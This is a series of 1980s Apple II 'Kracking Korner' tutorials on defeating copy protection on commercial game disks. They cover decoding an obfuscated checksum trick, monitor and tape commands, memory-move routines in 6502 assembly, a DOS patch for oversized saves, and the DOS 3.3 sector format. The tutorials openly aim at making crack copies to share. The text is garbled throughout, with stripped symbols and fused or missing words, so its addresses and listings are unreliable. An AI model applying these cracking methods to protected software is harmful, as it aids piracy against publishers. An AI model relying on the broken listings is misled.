FASHION, THE ON LINERS HAVE PUSHED TWO BYTES ON THE STACK AND EXECUTED AN RTS, WHICH JUMPS TO THE LOCATION ONE HIGHER THAT THE VALUES STORED.  THE STORY OF THE SUBROUTINE GOES LIKE THIS   CREATE A CHECKSUM BY EXCLUSIVE ORING TOGETHER ALL THE BYTES FROM 2700 TO 27FF, AND STORE IT IN  10.  THIS ALLOWS A CHECK TO SEE IF ANY OF THE BYTES IN THE NIBBLE COUNT ROUTINE WERE ALTERED.  DO A SECOND CHECKSUM ON EVERY OTHER BYTE FROM 2700 TO 27FF, STARTING WITH A VALUE OF   20.  STORE THIS IN  11, THEN EXCLUSIVE OR IT WITH   B7 TO PRODUCE THE LOW BYTE OF THE RETURN ADDRESS FF.  PUSH THIS ON THE STACK, EXCLUSIVE OR THE FIRST CHECKSUM WITH   11 TO PRODUCE THE RETURN HIGH BYTE OF  26, THEN DO THE RTS TO JUMP TO 2700.  WHEN YOU LOOK AT 2700, YOU FIND THIS   2700  CE 03 27    DEC    2703 2703  EF         2704  03         2705  27         2706  AD 24 27    LDA    2724 2709  49 8A     EOR     8A 270B  D0 01     BNE    270E 270D  20 8D 24    JSR    248D 2710  27         2711  D0 01     BNE    2714 2713  4C A0 25    JMP    25A0 2716  98     TYA 2717  59 00 27    EOR    2700,Y 271A  99 00 27    STA    2700,Y 271D  C8     INY 271E  D0 F6     BNE    2716     YOU SEE, NOW THAT WE'RE FAMILIAR WITH THIS KIND OF TRICK, THERE'S NOTHING TO DECODING THAT MESS, IS THERE      STAY TUNED FOR NEXT WEEK, WHEN WE FINISH THIS SUBJECT BY ANSWERING THE BURNING QUESTION  WHAT IS THE WINDOW SHADE TECHNIQUE  , AND PROCEED TO A DISCUSSION OF MEMORY MOVING AND FILE SAVING.                                                                                                     KRAKOWICZ'S KRACKING KORNER                           THE BASICS OF KRACKING 3                          MEMORY MOVES, BINARY FILES, AND       KRAMMING FOR THE FINALS                                                                 IN THE LAST EPISODE, WE PONDERED THE STARTING ADDRESS OF A PROGRAM AND WAYS TO FIND IT IN SPITE OF THE PROTECTORS' SUBTERFUGE.  THIS TIME WE'LL DISCUSS HOW TO GET THE PROGRAM INTO SAVEABLE FORMAT, EVEN IF IT'S TOO LONG TO SAVE AS A BFILE. ALTHOUGH WE'LL BE REFERRING AT FIRST TO SINGLE LOAD PROGRAMS, MOST OF THESE TECHNIQUES ARE APPLICABLE TO PROGRAMS WITH DISK ACCESS.    BEFORE WE BEGIN THE PROCESS, LET ME PHILOSOPHIZE FOR A FEW SECONDS ON THE PROCEDURES AND PRACTICES TO BE USED.  THIS IS A DISCIPLINE   PERHAPS NOT SO DEMANDING AS CHAMPIONSHIP KARATE OR THE UNIFICATION CHURCH, BUT IT REQUIRES KNOWLEDGE, PATIENCE, AND ATTENTION TO DETAIL.  I URGE YOU TO BEGIN EACH ADVENTURE IN KRACKING WITH A SHARP PENCIL, PLENTY OF PAPER, AND A GOOD ERASER. FROM THIS POINT FORWARD IN OUR QUEST, RECORD KEEPING WILL OCCUPY AN IMPORTANT PART OF THE TOTAL ACTIVITY.  IF YOU HAVE A PRINTER, PRINT OUT ANY PERTINENT SECTIONS OF CODE AND WRITE IN YOUR OWN COMMENTS ABOUT WHAT IT MEANS.  WRITE DOWN EVERY ADDRESS OF INTEREST, AND KEEP ESPECIALLY CAREFUL NOTES OF THE NATURE AND SEQUENCE OF ALL MEMORY MOVES, STARTING POINTS, AND TRICKS USED BY THE PROTECTORS.  DO THIS NOT JUST BECAUSE IT'S CHARACTER BUILDING, BUT BECAUSE UNLESS YOU HAVE EXCEPTIONAL RECALL, ALL PROGRAMS WILL EVENTUALLY BLEND TOGETHER INTO A WARM AND FUZZY MEMORY.  KEEP GOOD NOTES ON EVERYTHING YOU LEARN, AND REMEMBER    THOSE WHO CANNOT RECALL THE MISTAKES OF THE PAST ARE DOOMED TO REPEAT THEM.     SUPPOSE YOU HAVE LOADED IN, RESET WITH YOUR OLD MONITOR ROM, AND FINALLY LOCATED THE STARTING ADDRESS TO THE GREATEST GAME EVER WRITTEN    HYPERSPACE ANDROID CLONE KILLER  OR  HACK .  THE STARTING ADDRESS IS 4123, AND THE GAME OCCUPIES MEMORY FROM 800 TO B000.  YOU ALREADY KNOW THAT IF ANY MEMORY ABOVE 9D00 HAS BEEN USED BY THE PROGRAM, DOS IS DEAD, AND YOU CAN'T SAVE THE PROGRAM TO DISK WITH A DOS COMMAND.  AS YOU ALSO UNDOUBTEDLY KNOW, IF THE PROGRAM WERE SMALLER YOU WOULD HAVE THE OPTION OF BOOTING A DISK AND SAVING THE GAME AS A BINARY FILE.  LET'S TAKE JUST A SECOND, THOUGH, AND REVIEW WHAT HAPPENS TO MEMORY WHEN YOU BOOT A DISK.    FIRST OF ALL, DON'T USE A MASTER DISK, SINCE THE DOS ON A MASTER IS LOADED FIRST INTO 1600 3FFF AND THEN RELOCATED TO THE HIGHER REGIONS OF MEMORY. BOOTING A 48K SLAVE DISK WILL DISTURB ONLY 0 8FF AND 9600 BFFF, AND IF YOUR PROGRAM LIVES WITHIN OR CAN BE REARRANGED TO FIT THESE BOUNDARIES, YOU CAN SAFELY BOOT THE DISK AND SAVE THE PROGRAM AS A BINARY FILE.    AN OLD METHOD OF SAVING A BINARY FILE IS WELL KNOWN TO THOSE OF US WHO BOUGHT APPLES IN THE DARK AGES BEFORE THE DISK II, BUT THERE ARE NOW MAYBE HALF A MILLION  !  APPLE OWNERS WHO ARE UNFAMILIAR WITH THE CASSETTE PORT AND ITS USE. IN GENERAL, ALMOST ANY CASSETTE RECORDER THAT HAS A TONE CONTROL CAN BE USED, BUT FOR SOME REASON THE CHEAPER ONES ARE GENERALLY BETTER.  TO USE ONE, PLUG BOTH CABLES INTO THE CORRECT CONNECTOR   IN  MEANS INTO THE COMPUTER, NOT INTO YOUR RECORDER , AND TURN THE TONE CONTROL ALMOST TO THE TOP OF THE TREBLE RANGE. SAVE A SMALL BASIC PROGRAM  REFER TO THE MANUAL FOR USE OF THE BASIC COMMANDS  AT ANY OLD VOLUME CONTROL SETTING.  TRY LOADING THE PROGRAM BACK IN SEVERAL TIMES, INCREASING THE VOLUME CONTROL SETTING UNTIL THE PROGRAM LOADS RELIABLY. YOU'LL FIND THAT THE TAPE WORKS VERY WELL, EVEN ON LONG FILES, ESPECIALLY WHEN THE SAME RECORDER IS USED TO RECORD AND PLAYBACK.    WHAT'S GOOD ABOUT THE TAPE SYSTEM IS THAT EVEN WHEN DOS IS COMPLETELY DEAD, THE MONITOR COMMANDS FOR TAPE I O ARE STILL ACTIVE  ASSUMING YOU DIDN'T WIPE THEM OUT OF YOUR OLD MONITOR ROM .  SEE THE REFERENCE MANUAL, PAGE 46 FOR A COMPLETE DESCRIPTION.  WITH TAPE, YOU CAN ALWAYS SAVE ANY PART OF MEMORY AT ANY TIME!   WORTH KEEPING IN MIND FOR THOSE CRUCIAL SITUATIONS WHEN THE SYSTEM CRASHES JUST AS YOU ARE FINISHING YOUR TERM PAPER ON THE WORD PROCESSOR .  THE CASSETTE ROUTINES USE ONLY LOCATIONS 3C 3F AND 42 43 IN ZERO PAGE, AND THE ONLY PART OF MEMORY YOU SHOULDN'T TRY TO SAVE IS C000 C0FF   SOME TERRIBLE THINGS CAN HAPPEN IF YOU TRY.  IN MOST CASES, IT'S BEST TO SAVE A LONG PROGRAM IN TWO FILES SO IT CAN BE RELOADED IN BETWEEN 800 AND 9600 AFTER DOS IS IN MEMORY.  FOR OUR EXAMPLE OF  HACK , THE NECESSARY MONITOR COMMANDS ARE          0.4FFFW  LONG WAIT         5000.AFFFW   LONGER WAIT     AFTER BOOTING A DISK, YOU CAN RELOAD WITH          1000.5FFFR  RELOAD FIRST HALF         BSAVE HACKLOW,A 1000,L 5000        BSAVE HACKHI,A 1000,L 6000    NOTE THAT IN THE TAPE READ AND WRITE COMMANDS, UNLIKE DOS, THE ACTUAL STARTING AND ENDING LOCATIONS ARE LISTED.  BE SURE YOU UNDERSTAND THE ONE BYTE DIFFERENCE BETWEEN THE TWO BEFORE YOU USE THEM.    THERE ARE ALSO OCCASIONS WHEN YOU WOULD LIKE TO SAVE APPLESOFT OR INTEGER BASIC PROGRAMS LOADED IN FROM A MODIFIED DOS ON A PROTECTED DISK  ARCADE MACHINE AND THE RAPID FIRE SERIES FROM SSI ARE EXAMPLES .  THIS IS SIMPLE WITH THE TAPE RECORDER, SINCE THE MONITOR ROUTINES ARE TOTALLY IGNORANT OF THE OPERATING SYSTEM IN RAM. IF YOU CAN LIST A BASIC PROGRAM, YOU CAN USUALLY SAVE IT TO TAPE.  TRY THE FOLLOWING WITH ONE OF THE ABOVE PROGRAMS   LOAD IN A PROGRAM MODULE  ANYTHING IN ARCADE MACHINE EXCEPT THE MAIN MENU , THEN HIT RESET WHILE IT'S RUNNING.  TYPE D6 00  THIS REMOVES THE APPLESOFT INTERNAL  PROTECTION  , THEN C081 TO SELECT THE MOTHER BOARD ROM  UNLESS YOU HAVE AN APPLE II WITH APPLESOFT ON A ROM CARD, THEN IT'S C080 TO SELECT SLOT 0 .  TYPE CONTROL C AND YOU SHOULD BE ABLE TO LIST THE PROGRAM AND THEN SAVE IT TO TAPE WITH THE  SAVE  COMMAND  SOMETIMES AN ADDITIONAL FAIRLY TRIVIAL PROTECTION SCHEME IS USED WITH APPLESOFT PROGRAMS   DELETING THE FIRST LINE NUMBER SO IT WON'T LIST.  IT WILL STILL SAVE TO TAPE AND YOU CAN RECONSTRUCT THE LINE NUMBER AT YOUR LEISURE . REMEMBER THAT THE BASIC  LOAD  AND  SAVE  COMMANDS DON'T ALLOW A FILE NAME TO BE ADDED. IF THERE ARE MORE THAN A FEW FILES ON THE DISK, THIS IS A VERY TEDIOUS WAY TO KRACK A PROGRAM, BUT BACK IN THE MIDDLE AGES BEFORE DEMUFFIN PLUS IT WAS SOMETIMES THE ONLY WAY.  YOU ALSO HAVE TO BE WARY OF BINARY ROUTINES WHICH ARE CALLED FROM OR MODIFY THE BASIC PROGRAMS.    YES, YOU'RE RIGHT.  GETTING OUT AND HOOKING UP THE TAPE RECORDER IS A CRAMP IN THE CALVINS, SO IT'S USUALLY LEFT WORKS.  IN GENERAL, IT'S BEST TO LEARN HOW TO MANIPULATE MEMORY TO SCRUNCH YOUR PROGRAM DOWN INTO A DOS FILE  IT WILL ALWAYS HAVE TO BE DONE, ANYWAY .  IN THE BEST OF ALL POSSIBLE WORLDS, YOUR DOS WOULD BE IN ROM MEMORY, AND WOULD ALLOW YOU TO SAVE ANY PROGRAM THAT RESIDED IN RAM MEMORY.  IN THE REAL WORLD, IT'S GENERALLY NECESSARY TO LOADED IN BY DOS FROM A NORMAL DISK  WE'LL TALK LATER ABOUT THOSE THAT CAN'T BE .  THIS PROCESS IS USUALLY CALLED  MEMORY MOVING , AND THE PURPOSE IS TO  TUCK IN  ALL THE PIECES OF THE PROGRAM THAT LIE OUTSIDE THE NORMAL PROGRAM MEMORY OF 800 9600 ALLOWED BY DOS.  THE OTHER HALF OF THE PROCESS IS THE  UNFOLDING  OF THE TUCKED IN PORTIONS OF MEMORY AFTER THE PROGRAM IS RELOADED UNDER DOS.  TO GAIN PERSPECTIVE ON THE PROCESS, LET'S LOOK AT MEMORY MAPS WITH DOS ACTIVE AND WITH  HACK  IN MEMORY. _______________________________________ !          ! !          ! !F800 FFFF  !MONITOR ROM!AUTOSTART ROM! !                                     ! !F000 F7FF  !

BEFORE WE BEGIN THE DISCUSSION OF THE TECHNIQUES OF MEMORY MOVING, LET'S RESTATE THE OBJECTIVE  WE'RE TRYING TO ARRANGE ALL THE PROGRAM INTO A SMALL ENOUGH SPACE THAT WE CAN BSAVE A FILE UNDER DOS  THE DOS MANUAL WILL TELL YOU THAT THE LARGEST BINARY FILE YOU CAN SAVE IS 128 SECTORS, BUT IF YOU CHANGE LOCATION  A964  43364  TO  BF 191  YOU CAN SAVE A FILE AS LARGE AS THE ENTIRE RAM MEMORY .  REMEMBER THAT BOOTING A SLAVE DISK WILL MESS UP 0 8FF AND 9600 BFFF, SO THE LARGEST FILE IT'S PRACTIVAL TO SAVE IS ABOUT 145 SECTORS  YOU CAN, WITH CARE, OVERWRITE MUCH OF THE SCREEN MEMORY AND PAGES 2   3 TO SAVE A BFILE OF ABOUT 151 SECTORS, BUT THAT REQUIRES KNOWLEDGE AND CONSIDERABLE CARE .    LOOKING AT THE MEMORY MAP WITH HACK, YOU CAN SEE THAT THE MEMORY FROM 9600 TO B000 WILL HAVE TO BE STORED SOMEWHERE ELSE TO BRING THE FILE SIZE DOWN, AND THE PAGE FROM 800 8FF WILL HAVE TO BE STASHED TEMPORARILY DURING THE DISK BOOT TO RESTORE DOS.  TO FIND OUT WHAT AREAS OF MEMORY ARE FREE, SEARCH THROUGH ALL MEMORY WITH THE INSPECTOR AND LOOK FOR BLANK PAGES.  THE FOLLOWING TRICK WILL HELP   BEFORE YOU LOAD THE ORIGINAL, CLEAR ALL OF MEMORY TO ZERO  OR ANY OTHER BYTE YOU LIKE  WITH        800 0      801 800.95FFM    THEN YOU'LL BE ABLE TO SEE UNUSED MEMORY AREAS.  THIS DOESN'T ALWAYS WORK, SINCE MANY AREAS ARE COPIED TO A SECOND LOCATION AND NOT USED AFTERWARDS, SO IF YOU'RE HARD PRESSED FOR STORAGE MEMORY, IT'S A GOOD IDEA TO SCAN THROUGH ONCE WITH THE INPECTOR SET TO DECODE ASCII TO DETECT SUSPICIOUS SECTORS  LATELY, SOME OF THE PROTECTORS HAVE TAKEN TO STORING GARBAGE SUCH AS SOURCE CODE IN UNUSED PAGES OF MEMORY AND ON EMPTY DISK SECTORS .  NOTE DOWN ANY PAGES THAT ARE TOTALLY CLEAR, ANY THAT ARE ALL ONE BYTE, REGARDLESS OF WHAT IS IS, OR ANY THAT CONTAIN JUNK.  LET'S ASSUME FOR THIS EXAMPLE THAT LOCATIONS 1000 1FFF AND 8000 8FFF ARE BLANK.  WE HAVE 1A00  B000 9600  BYTES OF MEMORY  LEFTOVER  OR OUTSIDE OF THE DOS BOUNDARIES, SO THEY WILL ALL FIT INTO THE  2000 BLANK LOCATIONS THAT WE LOCATED.    STORE THE EXCESS BYTES IN THE HOLES BY TYPING          8000 9600.A5FFM       1000 A600.AFFFM    OR EQUIVALENT  THE SPLIT CAN BE ANY WAY THAT HELPS YOU KEEP TRACK OF THE PROCESS.  FINALLY, STASH THE MEMORY FROM PAGE 8 WITH  1B00 800.8FFM.  REMEMBER THAT THIS IS ONLY TEMPORARY.  BEFORE YOU DO ANYTHING ELSE, BOOT YOUR 48K SLAVE DISK, THEN RESTORE PAGE 8 WITH  800 1B00.1BFFM.  BEFORE YOU DO ANYTHING ELSE, SAVE THE PROGRAM WITH  BSAVE HACKALL,A 800,L 8E00  NINE OUT OF TEN TIMES YOU'LL FORGET TO CHANGE  A964  CONSIDER CHANGING IT IN THE DOS IN MEMORY BEFORE YOU INITIALIZE THE DISK SO IT WILL BE PERMANENT .  YOU CAN NOW TAKE A DEEP BREATH AND RELAX   ALL OF THE PROGRAM MEMORY IS SAFELY TUCKED AWAY.  ALL THAT'S LEFT IS TO WRITE A SHORT PROGRAM TO REVERSE THE MEMORY STORAGE.    TWO SHORT ROUTINES, SIMILAR TO THOSE SHOWN IN OUR FIRST BASICS LESSON ARE REQUIRED.  AGAIN, LET'S REVIEW THE STEPS NECESSARY FROM HERE TO RUN THE GAME      1.  LOAD THE  COMPRESSED  GAME INTO 800 95FF.   2.  MOVE THE PIECE OF MEMORY AT 8000 9FFF TO 9600 A5FF.   3.  MOVE THE PIECE OF MEMORY AT 1000 19FF TO A600 AFFF.   4.  JUMP TO THE STARTING ADDRESS AT  4123.    THE FOLLOWING PROGRAM WILL TAKE CARE OF STEPS 2 4.  IT MAY NOT BE IMMEDIATELY OBVIOUS THAT THIS PROGRAM MUST BE STORED WITHIN THE COMPRESSED PROGRAM IN A PAGE THAT IS BOTH EMPTY AND UNAFFECTED BY THE MEMORY MOVES YOU ARE ABOUT TO MAKE.  IN THIS CASE, PAGE 1C IS SAFE.   1C00  LDY   0     CLR Y REG  1C02  LDA  8000,Y  GET A BYTE AT 8000   1C05  STA  9600,Y  STORE IT AT 9600   1C08  INY     INCR. COUNTER  1C09  BNE  1C02    IF NOT PAGEND, REDO  1C0B  INC  1C04    INCR. SOURCE HIBYTE  1C0E  INC  1C07    INCR.

TIME OUT FOR A BRIEF DISCUSSION OF ONE OF THE SUBTLE POINTS OF MEMORY MOVES. ALTHOUGH YOU'RE GENERALLY ABLE TO MAKE YOUR MEMORY MOVES NON OVERLAPPING, YOU CAN HAVE A PROBLEM MOVING LARGE AMOUNTS OF MEMORY.  THE MEMORY MOVE ROUTINES SHOWN ABOVE ARE  FORWARD  MEMORY MOVES   THAT MEANS THAT UST MOVED.  SOMETIMES YOU WILL NEED TO MOVE, FOR INSTANCE, LOCATIONS 6000 8FFF TO 8000 AFFF. IF YOU USE THE FORWARD MOVES AS SHOWN, YOU CAN SEE THAT THE FIRST PAGE  PAGE 60 OR 6000 60FF  WILL LAND AT 8000 80FF, SMACK ON TOP OF THE ORIGINAL PAGE THAT WAS SUPPOSED TO BE MOVED LATER TO PAGE A0  A000 A0FF .  TO WORKS  DOWN  IN MEMORY INSTEAD OF UP.    IN THIS EXAMPLE, PAGE 8F IS FIRST MOVED TO AF, THEN 8E TO AE, ETC.  THIS WAY, WHEN IT FINALLY COMES TIMES TIME FOR PAGE 60 TO BE MOVED TO PAGE 80, THE ORIGINAL PAGE 80 WILL ALREADY HAVE BEEN MOVED. A TYPICAL ROUTINE FOR THIS IS     1000  LDY   0  1002  LDA  8F00,Y  1005  STA  6000,Y  1008  INY  1009  BNE  1002  100B  DEC  1004  100E  DEC  1007  1011  LDA  1007  1014  CMP   5F  1017  BNE  1002    OK  ALL THAT REMAINS IS TO GET TO THE START OF THE EARLIER MEMORY MOVE ROUTINE WHEN WE  BRUN  THE GAME.  THIS IS ACCOMPLISHED BY PUTTING THE CODE FOR  JMP  1C00  OR 4C 00 1C AT LOCATION  7FD  7FF AND MAKING THIS THE FIRST LOCATION OF THE PROGRAM.  WE CAN THEN SAVE A COMPLETE, FUNTIONING VERSION OF HACK WITH  BSAVE HACK,A 7FD,L 8E03 .  THIS CREATES YOUR FINAL, 145 SECTOR FILE OF HACK WHICH WILL BRUN WHENEVER YOU WISH.            A FEW HELPFUL HINTS              1.  ALWAYS KEEP A FEW INITIALLIZED 48K SLAVE DISKS NEARBY  IT'S ALARMING HOW FAST A DISK FILLS UP WITH SLIGHTLY DIFFERENT 145 SECTOR VERSIONS OF THE PROGRAM UNDERGOING KRACKING.    2.  MAKE YOUR PROGRAM NAMES AS DESCRIPTIVE AS YOU CAN, ESPECIALLY WHEN SAVING A PROGRAM IN PIECES.  IT'S VERY DISTURBING TO RETURN TO A KRACKING EFFORT AFTER A LONG WEEKEND TO FIND PROGRAMS ON THE DISK TITLES  HACKHI ,  HACKHIGH ,  HIGH ,  HH , ETC.  AND NOT BE SURE WHAT EACH ONE IS.  BETTER TO TYPE IN A FEW EXTRA LETTERS TO LET YOU KNOW THAT IT'S  HACK WITHOUT 9600UP  OR OR  HACK 4000 B000 ONLY .    3.  WHENEVER POSSIBLE, COMPRESS THE GAME TO THE MINIMUM NUMBER OF SECTORS BY DOING A FEW MORE MEMORY MOVES BEFORE AND AFTER SAVING. YOUR FRIENDS WILL APPRECIATE YOUR THOUGHTFULNESS IN MAXIMIZING THE NUMBER OF GAMES PER DISK AND MINIMIZING MODEM TIME.    4.    VERY IMPORTANT   WHEN YOU THINK YOU HAVE A COMPLETE, WORKING VERSION, CHECK IT OUT THOROUGHLY ON ALL LEVELS AND IN ALL MODES.  IT'S EXTREMELY EMBARASSING TO HAVE TO ISSUE A  PRODUCT RECALL  WHEN YOU LEARN A MONTH LATER THAT HACK CRASHES ON LEVEL 47 JUST AS THE HYPERGALACTIC FROG IS ABOUT TO DEVOUR NEW PITTSBURGH ON THE MARS COLONY...      NEXT TIME  PICTURE PACKING AND               RAM CARD TECHNIQUES                                                                                                              KRAKOWICZ'S KRACKING KORNER                           BASICS OF KRACKING   104                                                                  WHERE DO I BEGIN     SEVERAL PREVIOUS EPISODES OF THIS COLUMN HAVE DEALT WITH THE RELATIVELY SIMPLE TECHNIQUES WHICH CAN BE USED TO SAVE A SINGLE LOAD FILE TO DISK AS AN UNPROTECTED BINARY PROGRAM, AND IT IS NOW TIME TO EXPLORE THE LARGER AREA OF MULTIPLE PROGRAM DISKS, PROGRAMS WITH DISK ACCESS, AND THE APPROACHES USED TO PROTECT THEM FROM BEING COPIED.  WE WILL BEGIN WITH SIZING UP A DISK PROTECTION SCHEME, DECIDING ON A BASIC APPROACH, AND BEGINNING THE UNPROTECTION PROCESS  THE SUBJECT OF BOOT TRACING AS ANOTHER MEANS TO THE SAME END WILL BE DESCRIBED IN A FUTURE EPISODE, SINCE IT IS GENERALLY USED WITH MORE SOPHISTICATED PROTECTION SCHEMES .  THE SUBJECT IS TRULY MAMMOTH, AND WILL REQUIRE SEVERAL EPISODES TO COMPLETE.  FOR NOW, SETTLE BACK, OPEN A COLD BEVERAGE OF YOUR CHOICE, AND LET'S BEGIN A JOURNEY INTO THE FIRST LEVEL OF DISK PROTECTION   THE MODIFIED DOS  AS WE HAVE OFTEN MENTIONED BEFORE, TWO STALWART FRIENDS IN THIS QUEST ARE  BENEATH APPLE DOS  BY WORTH AND LECHNER, AND RANDY HYDE'S  DOSSOURCE .  IT IS POSSIBLE TO KRACK DISKS WITHOUT THEM, BUT WITH ABOUT THE SAME EASE AS PERFORMING AN ORAL APPENDECTOMY .    APPLE'S DOS, COMBINED WITH THE DIVISION OF HARDWARE BETWEEN THE DISK CONTROLLER CARD AND THE DISK ANALOG BOARD, IS A VERITABLE PLAYGROUND FOR THOSE WHO PRODUCE DISK PROTECTION.  THERE ARE LITERALLY THOUSANDS OF DIFFERENT THINGS WHICH CAN BE DONE TO MAKE COPYING A DISK DIFFICULT, CHALLENGING, AND  MAYBE SOMEDAY , IMPOSSIBLE.  IN SO DOING, THEY PROVIDE HOURS OF VERY INGENIOUS PUZZLES, BOUNDLESS INTELLECTUAL STIMULATION, AND NOT INCIDENTALLY, THE INCENTIVE TO LEARN MUCH MORE ABOUT PROGRAMMING, THE APPLE, DOS, ASSEMBLY LANGUAGE, AND TREACHERY THAN WE WOULD OTHERWISE HAVE THE DESIRE TO LEARN.    BY FAR THE MOST COMMON TECHNIQUE USED TO PROTECT ENTIRE DISKS IS TO MAKE MODIFICATIONS TO THE OPERATING SYSTEM, AND SPECIFICALLY TO THE READ WRITE TRACK AND SECTOR  RWTS  ROUTINES WHICH DEFEAT ORDINARY COPY PROGRAMS  COPYA AND SUPER DISK COPY 3.X ARE EXAMPLES, BUT WE'LL SEE LATER HOW BOTH OF THESE CAN BE USED TO OUR ADVANTAGE .  TO FIND THE MOST EFFICIENT APPROACH TO DEFEATING THESE PROTECTION TECHNIQUES, WE NEED FIRST TO SPEND A FAIR AMOUNT OF TIME DESCRIBING IT FROM THE CRACKIST'S VIEWPOINT.     ON THE FUNDAMENTAL PRINCIPLE THAT GIVING A MAN A FISH ALLOWS HIM TO EAT FOR A DAY WHILE TEACHING HIM TO FISH ALLOWS HIM TO EAT FOR LIFE, WE WILL NOT DWELL ON THE SUBJECT OF  COPYING  AS SUCH.  MANY OF THE TECHNIQUES DESCRIBED HERE ARE, HOWEVER, VERY USEFUL IN DECIDING HOW TO GO ABOUT COPYING A DISK.  PERHAPS AN ASPIRING AUTHOR OUT THERE WILL BUILD FROM THE INTRODUCTION GIVEN HERE TO PURSUE THE SUBJECT IN DEPTH...      BEFORE WE CAN GET TO THE CORE OF THE MATTER, WE MUST UNDERSTAND MUCH MORE OF THE PROCESSING AND ENCODING SYSTEMS USED BY DOS TO STORE INFORMATION ON THE DISK.  THIS IS FAIRLY HEAVY STUFF, BUT YOUR KRACKING ABILITY DEPENDS MORE THAN ANYTHING ELSE ON YOUR KNOWLEDGE OF THIS SUBJECT.  TRY YOUR BEST TO WORK THROUGH IT NOW, AND THE REST OF THE PROCESS WILL BE MUCH EASIER.    WE ALREADY KNOW THAT EACH TRACK CONSISTS OF 16 SECTORS WHICH EACH REPRESENT ONE PAGE  256 BYTES  OF DATA.  A SECTOR ACTUALLY CONSISTS OF TWO SEPARATE PARTS, AN ADDRESS FIELD, WHICH TELLS DOS WHICH SECTOR IT IS, AND A DATA FIELD, WHERE THE ACTUAL BYTES ARE STORED.  TO BEGIN A TRIP AROUND THE DISK, LET'S LOOK FIRST AT THE BYTE SEQUENCE TAKEN FROM A NORMAL, UNMODIFIED DOS DISK AT TRACK0, SECTOR 0  AS WE MENTIONED EARLIER, THE TERMS 'BYTE' AND 'NIBBLE' ARE OFTEN USED INTERCHANGEABLY TO REFER TO THE DATA READ OFF THE DISK.  THE USE OF 'NIBBLE' IS NOT REALLY ACCURATE IN REFERENCE TO DOS 3.3, BUT PERSISTS FOR HISTORICAL REASONS .        FF FF FF FF D5 AA 96 FF FE AA AA                                  ________ 1 __    _ 2      3   4      AA AA FF FE DE AA EB FF FF FF FF                                   5    6     7   _____ 8 ______     THE FIRST FEW FF'S  1  ARE KNOWN AS GAPBYTES, BUT THEY'RE CORRECTLY TERMED SYNCBYTES, AND WE'LL TREAT THEM AS SIMPLE SEPARATORS FOR NOW.  NEXT ARE THE THREE MOST IMPORTANT BYTES ON THE DISK, D5 AA 96  2 .  THIS SEQUENCE MAY NOT OCCUR ANYWHERE ELSE ON THE DISK EXCEPT THE ADDRESS FIELD, AND SERVES AS A UNIQUE IDENTIFICATION MARKER. THESE BYTES ARE KNOWN BY ALL SORTS OF COLLOQUIALISMS, INCLUDING  ADDRESS MARKER ,  HEADER BYTES ,  LEADER BYTES ,  PROLOG , AND OTHERS.  THEY WILL ALWAYS, REPEAT ALWAYS, OCCUR ON AT LEAST SECTOR 0 OF TRACK 0 OF EVERY APPLE DISK WHICH LOADS UNDER DOS 3.3  THE FIRST LAW DEMANDS IT .    THE NEXT FOUR SEQUENCES ENCODE THE VOLUME NUMBER  3 , TRACK NUMBER  4 , SECTOR NUMBER  5 , AND CHECKSUM  6 .  EACH NUMBER IS A SINGLE BYTE, WRITTEN IN AN OLD STYLE ENCODING SCHEME CALLED 4 4 NIBBLIZING.  THIS IS A FORMAT FOR STORING DATA ON THE DISK IN WHICH THE EVEN BITS OF A BYTE ARE STORED IN ONE 8 BIT SEQUENCE  REPRESENTING ONE HALF OF THE ORIGINAL BYTE OR ONE NIBBLE , AND THE ODD BITS ARE STORED IN THE SECOND  BYTE   THE REQUIREMENT FOR THIS SORT OF  BYTE SPLITTING  OR NIBBLIZING WAS ESTABLISHED LARGELY BY THE LIMITATIONS IMPOSED BY DISK DRIVE HARDWARE.  YOU CAN FIND MUCH MORE INFORMATION IN B.  A. D., PP.  3 12 TO 3 21, BUT AN OVERSIMPLIFICATION IS THAT, IN THE OLD DAYS, AT LEAST EVERY OTHER BIT READ FROM THE DISK HAD TO BE A LOGICAL  ONE , OR THE CIRCUITRY THAT READ THE DISK  FORGOT  WHERE IS WAS AND WHAT IT WAS DOING .  IF YOU ARE INTERESTED IN MORE DETAIL ON THE MECHANICS OF THE 4 4 SCHEME, REFER TO THE VERY FIRST KRACKING KORNER FILE ON CYCLOD AND THE FILE ON WAY OUT. THE TABLE BELOW LISTS THE VALUES OF NIBBLES OF INTEREST TO US IN THIS FORMAT   FIRST  SECOND BYTE   FIRST  SECOND BYTE NIBBLE NIBBLE VALUE  NIBBLE NIBBLE VAL.                                           AA  AA 0     AA      BA    10  AA  AB 1     AA      BB    11  AB  AA 2     AB      BA    12  AB  AB 3     AB      BB    13  AA  AE 4     AA      BE    14  AA  AF 5     AA      BF    15  AB  AE 6     AB      BE    16  AB  AF 7     AB      BF    17  AE  AA 8     AE      BA    18  AE  AB 9     AE      BB    19  AF  AA A     AF      BA    1A  AF  AB B     AF      BB    1B  AE  AE C     AE      BE    1C  AE  AF D     AE      BF    1D  AF  AE E     AF      BE    1E  AF  AF F     AF      BF    1F          BA      AA    20         BA      AB    21         BB      AA    22          FF      FE    FE           VOL 254     WE CAN NOW DECODE THE FOUR GROUPS OF BYTES AS   VOL  254  3 , TRACK  0  4 , SECTOR  0  5 , AND CHECKSUM  FE  6 .  THE FIRST THREE ARE SELF  EXPLANATORY, AND THE LAST IS USED TO DETECT ANY ERRORS WHICH MAY CREEP IN AFTER MANY HOURS OF DISK USE.  FOLLOWING THESE IS A SEQUENCE OF BYTES  7  USED TO MARK THE END OF THE ADDRESS FIELD.  A TOTAL OF THREE BYTES  DE AA EB  ARE WRITTEN TO THE DISK, BUT ONLY THE FIRST TWO ARE CHECKED WHEN THE FIELD IS READ.  THIS PAIR OF BYTES IS KNOWN VARIOUSLY AS  CLOSING BYTES ,  TRAILERS , OR THE  EPILOG .  FINALLY, THERE IS ANOTHER SERIES OF GAPBYTES  8  WHICH SEPARATES THE ADDRESS FIELD FROM THE FOLLOWING DATA FIELD.8    THE DATA FIELD HAS A SIMILAR STRUCTURE       FF FF FF D5 AA AD     342 BYTES OF                 ______ 1 _     _ 2      _____ 3 ____      DATA     CKSUM  DE AA EB FF FF FF                                     4     5        __ 6 __    WHERE THE GAPBYTES  1  ARE SAME GROUP THAT ENDED THE ADDRESS FIELD.  THE DATA MARKER BYTES  2  ARE ALSO CALLED BY ALL THE NAMES MENTIONED FOR THE ADDRESS MARKER, AND ARE INTERPRETED BY DOS AS  HERE COMES THE DATA...  THE BIG STRETCH OF 342 BYTES  3  IS A VERY COMPLEX WAY OF STORING 256 BYTES ON A DISK, FOLLOWING SOME COMPROMISES MADE WITH THE ORIGINAL LAWS OF DISK RECORDING.  WITHOUT GOING 